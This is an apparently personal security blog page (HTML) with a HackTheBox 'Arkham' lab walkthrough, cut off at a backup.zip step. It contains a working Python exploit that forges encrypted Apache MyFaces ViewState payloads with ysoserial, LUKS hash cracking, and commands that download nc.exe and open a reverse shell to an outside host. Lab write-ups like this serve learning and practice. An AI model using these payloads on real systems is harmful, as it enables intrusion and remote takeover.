@@ -1,0 +1,1105 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Pwny_Sec</title>
+    
+      <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="revised" content="2019-09-02T23:18:39 EDT">
+<title>ARKHAM-writeup :: Pwny_Sec</title>
+<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
+<link href="/css/font-awesome.min.css" rel="stylesheet">
+<link href="/css/nucleus.css" rel="stylesheet">
+<link href="/theme-flex/style.css" rel="stylesheet">
+
+	<link href="/theme-flex/variant-red.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<script src="/js/jquery-2.x.min.js"></script>
+<script type="text/javascript">
+      var baseurl = "\/";
+</script>
+<meta name="description" content="">
+
+
+
+    
+  </head>
+  <body data-url="/hackthebox/boxes/arkham/writeup/">
+    
+      <header>
+  <div class="logo">
+    
+
+
+
+
+<h2 id="pwny-sec">Pwny_Sec</h2>
+
+
+
+
+  </div>
+  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
+    <nav class="shortcuts">
+            <li class="" role="">
+                <a href="https://twitter.com/pwny_sec"  rel="noopener">
+                  <i class='fa fa-twitter'></i> <label>Twitter</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
+                  <i class='fa fa-github'></i> <label>Github repo</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
+                  <i class='fa fa-cloud-download'></i> <label>Download</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="#"  rel="noopener">
+                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="/credits"  rel="noopener">
+                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
+                </a>
+            </li>
+    </nav>
+</header>
+<article>
+  <aside>
+    <ul class="menu">
+<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
+<li data-nav-id="/concepts/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/dll/" class="dd-item">
+    <div>
+        <a href="/concepts/dll/">
+            DLL_CraFt&amp;BreW
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/file-transfer/" class="dd-item">
+    <div>
+        <a href="/concepts/file-transfer/">
+            File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
+        ">
+    <div>
+        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
+        ">
+    <div>
+        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
+        ">
+    <div>
+        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
+        ">
+    <div>
+        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/concepts/bypass/" class="dd-item">
+    <div>
+        <a href="/concepts/bypass/">
+            Windows-Bypass
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
+        ">
+    <div>
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
+        ">
+    <div>
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/arkham/" class="dd-item parent haschildren
+        ">
+    <div>
+        <a href="/hackthebox/boxes/arkham/">Arkhams</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/arkham/writeup/" class="dd-item parent active
+        ">
+    <div>
+        <a href="/hackthebox/boxes/arkham/writeup/">ARKHAM-writeup</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/arkham/notes/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/arkham/notes/">arkham notes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/chaos-og/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/chaos-og/">
+            CHAOS
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/inusectf/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/inusectf/">
+            CTF
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/carrier/">
+            Carrier
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/carrier-root/">
+            CarrierRoot
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/devel/">
+            Devel
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/ethereal/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/ethereal/">
+            Ethereal
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/flujab/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/flujab/">
+            Flujab
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/friendzone/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/friendzone/">
+            FriendZone
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/grand-pa/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/grand-pa/">
+            GrandMa
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/helpline/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/hackthebox/boxes/helpline/">Helplines</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/helpline/writeup/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/helpline/writeup/">HelpLine-WriteUp</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/helpline/notes/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/helpline/notes/">Helpdesk-Notes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/lightweight/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/lightweight/">
+            LightWeight
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/help/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/help/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/help/">
+            Network Manager Down
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/optimum/">
+            Optimum
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sense/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/sense/">
+            Sense
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sizzle/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/sizzle/">
+            Sizzle
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/gold-sizzle/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/gold-sizzle/">
+            Sizzle-Gold
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sneaky/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/sneaky/">
+            Sneaky
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/vault/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/vault/">
+            Vault
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/teacher/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/teacher/">
+            teacher
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
+    <div>
+        <a href="/hackthebox/github/hugopowershell/">
+            Hugo/Github/Power
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
+    <div>
+        <a href="/hackthebox/challenges/bloodhound/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/tmux/" class="dd-item">
+    <div>
+        <a href="/hackthebox/tmux/">
+            TMUX
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/linux/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/linux/">Linuxes</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/linux/ftp/" class="dd-item">
+    <div>
+        <a href="/linux/ftp/">
+            FTP
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/filetransfer/" class="dd-item">
+    <div>
+        <a href="/linux/filetransfer/">
+            File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/netcat/" class="dd-item
+        ">
+    <div>
+        <a href="/linux/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/nmap/" class="dd-item">
+    <div>
+        <a href="/linux/nmap/">
+            Nmap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/snmpwalk/" class="dd-item
+        ">
+    <div>
+        <a href="/linux/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/tunneling/" class="dd-item">
+    <div>
+        <a href="/linux/tunneling/">
+            Tunnels
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/ssh/" class="dd-item">
+    <div>
+        <a href="/linux/ssh/">
+            ssh
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/webapp/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/webapp/burp/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/webapp/burp/">Burp</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/webapp/burp/burp/" class="dd-item">
+    <div>
+        <a href="/webapp/burp/burp/">
+            Burp
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/webapp/gobuster/" class="dd-item">
+    <div>
+        <a href="/webapp/gobuster/">
+            GoBuster
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/webapp/hydra/" class="dd-item">
+    <div>
+        <a href="/webapp/hydra/">
+            Hydra
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/webapp/skipfish/" class="dd-item
+        ">
+    <div>
+        <a href="/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/webapp/sqlmap/sqlmap/" class="dd-item">
+    <div>
+        <a href="/webapp/sqlmap/sqlmap/">
+            SqlMap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/webapp/wfuzz/" class="dd-item
+        ">
+    <div>
+        <a href="/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/windows/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/windows/">Windows</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/windows/bloodhound/" class="dd-item">
+    <div>
+        <a href="/windows/bloodhound/">
+            BloodHound Neo4j
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/windows/chisel/" class="dd-item">
+    <div>
+        <a href="/windows/chisel/">
+            ChiselTunnel
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/windows/filetransfer/" class="dd-item">
+    <div>
+        <a href="/windows/filetransfer/">
+            File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/windows/linux-smb-enum/" class="dd-item">
+    <div>
+        <a href="/windows/linux-smb-enum/">
+            SMB
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/windows/smb/" class="dd-item">
+    <div>
+        <a href="/windows/smb/">
+            SMB-KALI
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/windows/windows_enum/" class="dd-item">
+    <div>
+        <a href="/windows/windows_enum/">
+            Windows
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+
+
+
+    </ul>
+    <section>
+    </section>
+  </aside>
+  <section class="page">
+    
+    <div class="nav-select">
+      <center>Navigation : 
+        <select onchange="javascript:location.href = this.value;">
+          
+    <option value="/concepts/" >
+   Concept</option>
+    <option value="/hackthebox/" >
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+    <option value="/hackthebox/boxes/arkham/" >
+  -- 
+   Arkhams</option> 
+    <option value="/hackthebox/boxes/arkham/writeup/"  selected>
+  --- 
+   ARKHAM-writeup</option> 
+  
+    <option value="/hackthebox/boxes/arkham/notes/" >
+  --- 
+   arkham notes</option>
+  
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+      <option value="/hackthebox/boxes/chaos-og/" >-- CHAOS</option>
+      <option value="/hackthebox/boxes/inusectf/" >-- CTF</option>
+      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
+      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
+      <option value="/hackthebox/boxes/ethereal/" >-- Ethereal</option>
+      <option value="/hackthebox/boxes/flujab/" >-- Flujab</option>
+      <option value="/hackthebox/boxes/friendzone/" >-- FriendZone</option>
+      <option value="/hackthebox/boxes/grand-pa/" >-- GrandMa</option>
+    <option value="/hackthebox/boxes/helpline/" >
+  -- 
+   Helplines</option>
+    <option value="/hackthebox/boxes/legacy/" >
+  -- 
+   Legacy</option>
+      <option value="/hackthebox/boxes/lightweight/" >-- LightWeight</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+    <option value="/hackthebox/boxes/help/" >
+  -- 
+   Network Manager Down</option>
+      <option value="/hackthebox/boxes/help/" >-- Network Manager Down</option>
+      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/" >
+  -- 
+   SecNotes</option>
+      <option value="/hackthebox/boxes/sense/" >-- Sense</option>
+      <option value="/hackthebox/boxes/sizzle/" >-- Sizzle</option>
+      <option value="/hackthebox/boxes/gold-sizzle/" >-- Sizzle-Gold</option>
+      <option value="/hackthebox/boxes/sneaky/" >-- Sneaky</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+      <option value="/hackthebox/boxes/vault/" >-- Vault</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/zipper/" >
+  -- 
+   Zipper</option>
+    <option value="/hackthebox/boxes/oz/" >
+  -- 
+   oz</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+      <option value="/hackthebox/boxes/teacher/" >-- teacher</option>
+  
+    <option value="/hackthebox/github/" >
+  - 
+   GitHub</option>
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+      <option value="/hackthebox/tmux/" >- TMUX</option>
+  
+    <option value="/linux/" >
+   Linuxes</option>
+    <option value="/webapp/" >
+   WebApps</option>
+    <option value="/windows/" >
+   Windows</option>
+
+
+
+        </select>
+      </center>
+    </div>
+      <div>
+        <div class="searchbox">
+          <input data-search-input id="search-by" type="text" placeholder="Search...">
+        </div>
+        <script type="text/javascript" src="/js/lunr.min.js"></script>
+        <script type="text/javascript" src="/js/auto-complete.js"></script>
+        <link href="/css/auto-complete.css" rel="stylesheet">
+        <script type="text/javascript">
+          
+              var baseurl = "\/";
+          
+        </script>
+        <script type="text/javascript" src="/js/search.js"></script>
+      </div>
+    
+
+    <h1>ARKHAM-writeup</h1>
+    
+    
+    
+
+<p>Arkham we begin our journey with with the webpage on port 8080. the website use apache my faces or java server faces. Login intot he smbshares as guest then find encryption secret inside a LUKS (llinux unified key setup) . we&rsquo;ll write a python script to construct our own malicious Myfaces payload. Get a shell as alfred and have to read a outlook email(hard if you don&rsquo;t own outlook lol).  We get batmans password and login via winrm. Then escalate to Adminsitrator high jacking a dll.</p>
+
+<p>I ran a bunch of nmap scans in the raw notes.</p>
+
+<pre><code>nmap -oA nmap/tcp-connect 10.10.10.130
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 12:31 EDT
+Nmap scan report for 10.10.10.130
+Host is up (0.044s latency).
+Not shown: 995 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+8080/tcp open  http
+</code></pre>
+
+<p>So theres a share called <mark>Batshare</mark> with a file call appserver.zip.</p>
+
+<pre><code>smbmap -u guest -H 10.10.10.130 -r                                                                                         
+[+] Finding open SMB ports....                                                                                                                               
+[+] User SMB session establishd on 10.10.10.130...                                                                                                           
+[+] IP: 10.10.10.130:445        Name: 10.10.10.130                                                                                                           
+        Disk                                                    Permissions                                                                                  
+        ----                                                    -----------                                                                                  
+        ADMIN$                                                  NO ACCESS                                                                                    
+        BatShare                                                READ ONLY                                                                                    
+        ./                                                                                                                                                   
+        dr--r--r--                0 Sun Feb  3 08:04:13 2019    .                                                                                            
+        dr--r--r--                0 Sun Feb  3 08:04:13 2019    ..                                                                                           
+        fr--r--r--          4046695 Sun Feb  3 08:04:13 2019    appserver.zip 
+</code></pre>
+
+<p>Run smbclient, since guest is default you dont need to list the user. When prompted for the password, HIT ENTER.</p>
+
+<pre><code>smbclient //10.10.10.130/BateShare
+mget appserver.zip
+</code></pre>
+
+<p><em>HASHCAT</em></p>
+
+<p>The backup image is envrypted using luk which is a linux disk encryptino.</p>
+
+<pre><code>hashcat -m 14600 -a 0 -w 3 hashes\backup.img rockyou.txt -o found
+
+</code></pre>
+
+<p><img src="hashes.PNG" alt="hashes" /></p>
+
+<p><img src="batmanforever.PNG" alt="batmanforever" /></p>
+
+<p><strong>LUKS</strong> Linux Unified Key Setup</p>
+
+<p>is a disk encryption, created by Fruhwirth in 2004, was originally intended for linux. Well be trying to decrypt the <strong>LUKS</strong> encrypted volume. Well use the cryptsetup tool to decrypt the volume. i know i did it a different way some how but i didn&rsquo;t record it. lame.</p>
+
+<pre><code>file backup.img
+cryptsetup open --type luks backup.img batman
+ls -l /dev/mapper/ 
+mkdir /mnt/arkham
+mount /dev/mapper/batman /mnt/batman
+</code></pre>
+
+<p>We&rsquo;ll notice that there are some images and some tomcat stuff and a batman begins screen play. This will give us the encryption algoryth need for the myfaces. using grep to find the file need <mark>web.xml.bak</mark>, this tells us the secret used to encrypt the myfaces. mauahahahahaha. SnNGOTg3Ni0 is a base64 encoded string.</p>
+
+<pre><code>SnNGOTg3Ni0=
+JsF9876-
+HmacSHA1
+</code></pre>
+
+<pre><code>&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+    &lt;context-param&gt;
+        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;
+        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;
+     &lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/pavram-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+</code></pre>
+
+<p><img src="luks2.PNG" alt="luks2" /></p>
+
+<p><strong>PHASE2</strong></p>
+
+<p>Now that we have all the intell we need to take advantage of the apache myfaces. we&rsquo;ll take a look at the webapp now and start poking around. there are two webpage 80 then 8080. Navigate to 8080 then go to subscriptions. well be attacking the subscription page. I took the the viewstate and used cyberchief to decode then decrypt the string.</p>
+
+<p><img src="signing-up-service3.PNG" alt="signing-up-service3" /></p>
+
+<p><img src="signing-up-service2.PNG" alt="signing-up-service2" /></p>
+
+<p><img src="signing-up-service.PNG" alt="signing-up-service" /></p>
+
+<p><img src="signing-up-service9.PNG" alt="signing-up-service9" /></p>
+
+<p><img src="chie.PNG" alt="chie" /></p>
+
+<p>viewstate is encrypted &amp; encoded on top of that it has a hash it uses to verify it hasn&rsquo;t been changed. the cipher used is single des by default( DEFAULT). Then a hash is taken of the encrypted string. All of that is bundled by encoding everything in base64. So to decrypt everything used python module crypto &amp; some other modules but they are pretty common i suppose. i had some trouble getting everything right so i used allot of prints to get the right, output. for more example at the test script go to my notes.</p>
+
+<p>the hmac takes up 20 bytes at the end. Ysoserial encryption type or whatever CommonsCollections5</p>
+
+<p>i made a bunch of methods that i call at the end to assemble it int he order i want.</p>
+
+<pre><code>from Crypto.Cipher import DES
+from Crypto.Hash import HMAC, SHA1
+import base64
+import subprocess
+import urllib
+
+#variables#
+command = raw_input('Command: ')
+ysoserial = b'java -jar /opt/ysoserial/ysoserial.jar CommonsCollections5 \'' + command + '\''
+payload = subprocess.check_output(ysoserial, stderr=subprocess.STDOUT, shell=True)
+
+###methods#####
+def encrypt_vs(data):
+  key = 'JsF9876-'
+  mode = DES.MODE_ECB
+  cipher = DES.new(key,mode)
+  pad = (8 - (len(data) % 8)) % 8
+  padded = data + (chr(pad)*pad).encode()
+  return cipher.encrypt(padded)
+def hmac_vs(data):
+  key = 'JsF9876-'
+  mode = digestmod=SHA1
+  h = HMAC.new(key, data, mode)
+  return h.digest()
+#########
+
+ippsec = encrypt_vs(payload)
+ippsmac = (hmac_vs(ippsec))
+raw = ippsec + ippsmac
+encoded = (raw).encode(&quot;base64&quot;).replace('\n','')
+pleasesubscribe = (urllib.quote_plus(encoded))
+print (pleasesubscribe)
+</code></pre>
+
+<p><strong>Shell</strong></p>
+
+<p>​   Since it seem like there are some limitation most likely i can&rsquo;t run new-object. well use invoke web-request to write out payload to disk then run a second command to get our shell, payload of choice is nc.exe.</p>
+
+<pre><code>powershell -c iwr 'http://10.10.14.2/nc.exe' -outfile c:\windows\system32\spool\drivers\color\nc.exe  
+		-c command switch if you want
+cmd /c c:\windows\system32\spool\drivers\color\nc.exe -e cmd.exe 10.10.14.2 9913*
+</code></pre>
+
+<p><em>CLM</em></p>
+
+<pre><code>$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+
+<p><strong>CLUES.BAK</strong></p>
+
+<p>This part will have a couple of steps firstly setting up a tunnel to arkhams, localhost and gaining access to 5985. my notes say i was able to get alfreds creds to work. i remember seeing it alfred in my winrm directory. i digres, Notice the timestamps in alfreds directory. the ones changes between 8:48 to 9:33am are the newest and most interesting. Downloads has a backup folder with <strong>owur</strong> prize backup.zip. we could use nc to move it over, smbserver.py and copy and paste via certutil.</p>
+
